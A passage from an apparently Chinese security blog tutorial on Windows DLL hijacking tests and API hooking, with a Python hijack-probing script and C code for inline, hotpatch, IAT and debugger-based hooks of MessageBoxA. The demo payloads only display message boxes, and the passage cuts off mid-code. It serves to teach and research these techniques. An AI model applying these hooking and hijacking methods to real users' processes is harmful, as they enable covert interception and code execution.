class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_">test_hijack</span><span class="params">(filename, dlls)</span>:  </span><br><span class="line">    &quot;&quot;&quot;  </span><br><span class="line">    使用恶意DLL进行劫持测试  </span><br><span class="line">    :<span class="keyword">return</span>:  </span><br><span class="line">    &quot;&quot;&quot;    <span class="keyword">for</span> dll in dlls:  </span><br><span class="line">       os.<span class="title function_">rename</span><span class="params">(<span class="string">&#x27;./files/payload32.dll&#x27;</span>, <span class="string">&#x27;./files/&#x27;</span>+dll)</span>  </span><br><span class="line">       proc = psutil.Popen(filename)  </span><br><span class="line">       time.sleep(<span class="number">0.5</span>)  </span><br><span class="line">       <span class="keyword">if</span> os.path.exists(<span class="string">&#x27;./temp_4396&#x27;</span>):  </span><br><span class="line">          print(f<span class="string">&quot;[+] &#123;dll&#125; for &#123;filename&#125; can be hijacked!&quot;</span>)  </span><br><span class="line">          os.remove(<span class="string">&#x27;./temp_4396&#x27;</span>)  </span><br><span class="line">       try:  </span><br><span class="line">          proc.<span class="built_in">terminate</span>()  </span><br><span class="line">       except psutil.NoSuchProcess:  </span><br><span class="line">          print(f<span class="string">&quot;[*] &#123;dll&#125; for &#123;filename&#125; may be hijacked!&quot;</span>)  </span><br><span class="line">       finally:  </span><br><span class="line">          os.rename(<span class="string">&#x27;./files/&#x27;</span>+dll, <span class="string">&#x27;./files/payload32.dll&#x27;</span>)</span><br></pre></td></tr></table></figure><p>对Windows XP下的notepad.exe进行测试的结果如下：<br><img src="/images/1-1.png" alt="1-1"></p><h2 id="4-API-Hook"><a href="#4-API-Hook" class="headerlink" title="4 API Hook"></a>4 API Hook</h2><p>网上对于Hook的分类有很多，上面在DLL注入中已经介绍了消息Hook，所以在这里就只介绍Ring3中的API Hook，即对系统DLL中的API函数进行挂钩。网上也有称之为Inject Hook的，但是我感觉还是API Hook最合适。<br>访问其他进程的最简单方式就是DLL，所以Hook通常也是通过DLL注入实现的。我们在DLL中设置好Hook函数，在DLL加载时就进行挂钩，DLL卸载时进行脱钩就可以实现完整的Hook过程。<br>此部分的代码很多都参考了selph师傅的博客，只实现了32位程序的Hook。</p><h3 id="4-1-Inline-Hook"><a href="#4-1-Inline-Hook" class="headerlink" title="4.1 Inline Hook"></a>4.1 Inline Hook</h3><p>修改API函数地址的开头的机器码为JMP跳转指令，如果还需要使用原有的API函数，则需要先Unhook，调用完后再重新Hook。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BYTE originOpcode[<span class="number">5</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InstallHook</span><span class="params">(PROC hookAddr)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">UninstallHook</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">Hook</span><span class="params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HMODULE hModule, DWORD  fdwReason, LPVOID lpReserved)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span> (fdwReason)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">InstallHook((PROC)Hook);</span><br><span class="line">MessageBoxA(<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="string">&quot;InstallHook!&quot;</span>, MB_OK);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">UninstallHook();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InstallHook</span><span class="params">(PROC hookAddr)</span></span><br><span class="line">&#123;</span><br><span class="line">BYTE hookOpcode[<span class="number">5</span>] = &#123; <span class="number">0xE9</span>, <span class="number">0</span> &#125;;</span><br><span class="line"><span class="comment">//HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, GetCurrentProcessId());</span></span><br><span class="line">HANDLE hProcess = GetCurrentProcess();</span><br><span class="line"><span class="comment">// 1. 获取API函数地址</span></span><br><span class="line">PROC procAddr = GetProcAddress(GetModuleHandleA(<span class="string">&quot;user32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line"><span class="comment">// 2. 修改内存属性</span></span><br><span class="line">DWORD originFlags = <span class="number">0</span>;</span><br><span class="line">VirtualProtectEx(hProcess, procAddr, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;originFlags);</span><br><span class="line"><span class="comment">// 3. 读取原机器码，保存</span></span><br><span class="line">ReadProcessMemory(hProcess, procAddr, originOpcode, <span class="number">5</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">// 4. 构造跳转机器码，写入</span></span><br><span class="line">DWORD jmpAddr = (DWORD)hookAddr - (DWORD)procAddr - <span class="number">5</span>;</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;hookOpcode[<span class="number">1</span>], &amp;jmpAddr, <span class="number">4</span>);</span><br><span class="line">WriteProcessMemory(hProcess, procAddr, hookOpcode, <span class="number">5</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">// 5. 恢复内存属性</span></span><br><span class="line">VirtualProtectEx(hProcess, procAddr, <span class="number">5</span>, originFlags, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">UninstallHook</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, GetCurrentProcessId());</span><br><span class="line"><span class="comment">// 1. 获取API函数地址</span></span><br><span class="line">PROC procAddr = GetProcAddress(GetModuleHandleA(<span class="string">&quot;user32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line"><span class="comment">// 2. 修改内存属性</span></span><br><span class="line">DWORD origin_flags = <span class="number">0</span>;</span><br><span class="line">VirtualProtectEx(hProcess, procAddr, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;origin_flags);</span><br><span class="line"><span class="comment">// 3. 将原来的机器码写入</span></span><br><span class="line">WriteProcessMemory(hProcess, procAddr, originOpcode, <span class="number">5</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">// 4. 恢复内存属性</span></span><br><span class="line">VirtualProtectEx(hProcess, procAddr, <span class="number">5</span>, origin_flags, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">Hook</span><span class="params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span></span><br><span class="line">&#123;</span><br><span class="line">UninstallHook();</span><br><span class="line">MessageBoxA(<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="string">&quot;Hooked!&quot;</span>, MB_OK);</span><br><span class="line">InstallHook((PROC)Hook);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="HotFix"><a href="#HotFix" class="headerlink" title="HotFix"></a>HotFix</h4><p>如果想要Hook的API函数的地址前有至少5字节空闲区域可以被利用，则可以在其地址前的5个字节构造JMP指令，在函数地址处构造机器码0xEB, 0xF9跳转到-7字节，即函数前5字节JMP指令，那么正常的API调用就会跳转到JMP指令上。如果我们需要使用原有的API函数，只需要调用函数地址+2就可以了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BYTE originOpcode[<span class="number">7</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InstallHook</span><span class="params">(PROC hookAddr)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">UninstallHook</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">Hook</span><span class="params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HMODULE hModule, DWORD  fdwReason, LPVOID lpReserved)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span> (fdwReason)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">InstallHook((PROC)Hook);</span><br><span class="line">MessageBoxA(<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="string">&quot;InstallHook!&quot;</span>, MB_OK);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">UninstallHook();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InstallHook</span><span class="params">(PROC hookAddr)</span></span><br><span class="line">&#123;</span><br><span class="line">BYTE hookOpcode[<span class="number">7</span>] = &#123; <span class="number">0xE9</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0xEB</span>, <span class="number">0xF9</span> &#125;;</span><br><span class="line">HANDLE hProcess = GetCurrentProcess();</span><br><span class="line"><span class="comment">// 1. 获取API函数地址, 计算Hook的起始地址</span></span><br><span class="line">PROC procAddr = GetProcAddress(GetModuleHandleA(<span class="string">&quot;user32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">PBYTE beginAddr = (PBYTE)procAddr - <span class="number">5</span>;</span><br><span class="line"><span class="comment">// 2. 读取原来的机器码</span></span><br><span class="line">DWORD originFlags = <span class="number">0</span>;</span><br><span class="line">VirtualProtectEx(hProcess, beginAddr, <span class="number">7</span>, PAGE_EXECUTE_READWRITE, &amp;originFlags);</span><br><span class="line">ReadProcessMemory(hProcess, beginAddr, originOpcode, <span class="number">7</span>, <span class="literal">NULL</span>);</span><br><span class="line">DWORD jmpAddr = (DWORD)hookAddr - (DWORD)procAddr; <span class="comment">// 此处加5减5正好抵消了</span></span><br><span class="line"><span class="comment">// 3. 构造跳转机器码，写入</span></span><br><span class="line"><span class="built_in">memcpy</span>(&amp;hookOpcode[<span class="number">1</span>], &amp;jmpAddr, <span class="number">4</span>);</span><br><span class="line">WriteProcessMemory(hProcess, beginAddr, hookOpcode, <span class="number">7</span>, <span class="literal">NULL</span>);</span><br><span class="line">VirtualProtectEx(hProcess, procAddr, <span class="number">7</span>, originFlags, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">UninstallHook</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">HANDLE hProcess = GetCurrentProcess();</span><br><span class="line">PROC procAddr = GetProcAddress(GetModuleHandleA(<span class="string">&quot;user32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">PBYTE beginAddr = (PBYTE)procAddr - <span class="number">5</span>;</span><br><span class="line">DWORD originFlags = <span class="number">0</span>;</span><br><span class="line">VirtualProtectEx(hProcess, beginAddr, <span class="number">7</span>, PAGE_EXECUTE_READWRITE, &amp;originFlags);</span><br><span class="line">WriteProcessMemory(hProcess, beginAddr, originOpcode, <span class="number">7</span>, <span class="literal">NULL</span>);</span><br><span class="line">VirtualProtectEx(hProcess, procAddr, <span class="number">7</span>, originFlags, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">Hook</span><span class="params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(WINAPI* MessageBoxA_t)</span><span class="params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span>;</span><br><span class="line">PROC procAddr = GetProcAddress(GetModuleHandleA(<span class="string">&quot;user32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">PBYTE endAddr = (PBYTE)procAddr + <span class="number">2</span>;</span><br><span class="line">MessageBoxA_t HookMessageBoxA = (MessageBoxA_t)endAddr;</span><br><span class="line">HookMessageBoxA(<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="string">&quot;Hooked!&quot;</span>, MB_OK);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-2-IAT-Hook"><a href="#4-2-IAT-Hook" class="headerlink" title="4.2 IAT Hook"></a>4.2 IAT Hook</h3><p>此方法是修改加载到内存中的PE结构中的IAT表，此时IAT表存储的已经是函数的地址了，我们只需要遍历IAT，找到要Hook的DLL中对应的API函数地址然后进行修改即可。此时并不会修改DLL中的IAT，所以原有的API函数依然可以正常使用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InstallHook</span><span class="params">(LPCSTR DLLName, PROC procAddr, PROC hookAddr)</span>;</span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">Hook</span><span class="params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HMODULE hModule, DWORD  fdwReason, LPVOID lpReserved)</span></span><br><span class="line">&#123;</span><br><span class="line">    PROC procAddr = GetProcAddress(GetModuleHandleA(<span class="string">&quot;user32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">    PROC hookAddr = (PROC)Hook;</span><br><span class="line"><span class="keyword">switch</span> (fdwReason)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        InstallHook(<span class="string">&quot;user32.dll&quot;</span>, procAddr, hookAddr);</span><br><span class="line">        MessageBoxA(<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="string">&quot;InstallHook!&quot;</span>, MB_OK);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        InstallHook(<span class="string">&quot;user32.dll&quot;</span>, hookAddr, procAddr);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InstallHook</span><span class="params">(LPCSTR DLLName, PROC procAddr, PROC hookAddr)</span></span><br><span class="line">&#123;</span><br><span class="line">HMODULE hModule = GetModuleHandle(<span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">// 解析PE</span></span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;</span><br><span class="line">PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((SIZE_T)hModule + pDosHeader-&gt;e_lfanew);</span><br><span class="line">DWORD szImageBase = pNtHeader-&gt;OptionalHeader.ImageBase;</span><br><span class="line">DWORD szImpRva = (DWORD)pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;</span><br><span class="line">PIMAGE_IMPORT_DESCRIPTOR pImpDes = (PIMAGE_IMPORT_DESCRIPTOR)(szImageBase + szImpRva);</span><br><span class="line">    <span class="comment">// 变量导入表</span></span><br><span class="line">    <span class="keyword">while</span> (pImpDes-&gt;Name) &#123;</span><br><span class="line">        DWORD szNameAddr = szImageBase + pImpDes-&gt;Name;</span><br><span class="line">        <span class="type">char</span> szName[MAXBYTE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        strcpy_s(szName, (<span class="type">char</span>*)szNameAddr);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(_strlwr(szName), DLLName) == <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)(pImpDes-&gt;FirstThunk + (DWORD)hModule);</span><br><span class="line">            <span class="keyword">while</span> (pThunk-&gt;u1.Function) &#123;</span><br><span class="line">                <span class="keyword">if</span> (pThunk-&gt;u1.Function == (DWORD)procAddr) &#123;</span><br><span class="line">                    <span class="comment">//修改访问权限</span></span><br><span class="line">                    DWORD dwOldProtect;</span><br><span class="line">                    VirtualProtectEx(GetCurrentProcess(), (LPVOID)&amp;pThunk-&gt;u1.Function, <span class="number">8</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">                    <span class="comment">//修改IAT</span></span><br><span class="line">                    pThunk-&gt;u1.Function = (DWORD)hookAddr;</span><br><span class="line">                    VirtualProtectEx(GetCurrentProcess(), (LPVOID)&amp;pThunk-&gt;u1.Function, <span class="number">8</span>, dwOldProtect, <span class="literal">NULL</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                pThunk++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        pImpDes++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">Hook</span><span class="params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span></span><br><span class="line">&#123;</span><br><span class="line">    MessageBoxA(<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="string">&quot;Hooked!&quot;</span>, MB_OK);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-3-Debug-Hook"><a href="#4-3-Debug-Hook" class="headerlink" title="4.3 Debug Hook"></a>4.3 Debug Hook</h3><p>使用Win32 API 实现一个简单的调试器，在API 函数地址处构造INT3断点，中断后调用Hook函数。感觉没啥太大意义。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CREATE_PROCESS_DEBUG_INFO g_cpdi;</span><br><span class="line">BYTE originOpcode = <span class="number">0</span>;</span><br><span class="line">BYTE intOpcode = <span class="number">0xCC</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InstallHook</span><span class="params">(PROC procAddr, LPDEBUG_EVENT pde)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">UninstallHook</span><span class="params">(PROC procAddr)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Hook</span><span class="params">(PROC procAddr, LPDEBUG_EVENT pde)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">DebugLoop</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    DebugActiveProcess(<span class="number">27464</span>);</span><br><span class="line">    DebugLoop();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InstallHook</span><span class="params">(PROC procAddr, LPDEBUG_EVENT pde)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;g_cpdi, &amp;pde-&gt;u.CreateProcessInfo, <span class="keyword">sizeof</span>(CREATE_PROCESS_DEBUG_INFO)); </span><br><span class="line">ReadProcessMemory(g_cpdi.hProcess, procAddr, &amp;originOpcode, <span class="keyword">sizeof</span>(BYTE), <span class="literal">NULL</span>);</span><br><span class="line">WriteProcessMemory(g_cpdi.hProcess, procAddr, &amp;intOpcode, <span class="keyword">sizeof</span>(BYTE), <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] 已添加断点！\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">UninstallHook</span><span class="params">(PROC procAddr)</span></span><br><span class="line">&#123;</span><br><span class="line">WriteProcessMemory(g_cpdi.hProcess, procAddr, &amp;originOpcode, <span class="keyword">sizeof</span>(BYTE), <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] 已取消断点！\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Hook</span><span class="params">(PROC procAddr, LPDEBUG_EVENT pde)</span></span><br><span class="line">&#123;</span><br><span class="line">    PEXCEPTION_RECORD per = &amp;pde-&gt;u.Exception.ExceptionRecord;</span><br><span class="line">    CONTEXT ctx;</span><br><span class="line">    SIZE_T titleAddr;</span><br><span class="line">    <span class="type">char</span> title[] = <span class="string">&quot;Hooked&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (per-&gt;ExceptionCode == EXCEPTION_BREAKPOINT) &#123;</span><br><span class="line">        <span class="keyword">if</span> (per-&gt;ExceptionAddress == procAddr) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] 程序已中断！\n&quot;</span>);</span><br><span class="line">            <span class="comment">// 1. 解除hook</span></span><br><span class="line">            UninstallHook(procAddr);</span><br><span class="line">            <span class="comment">// 2. 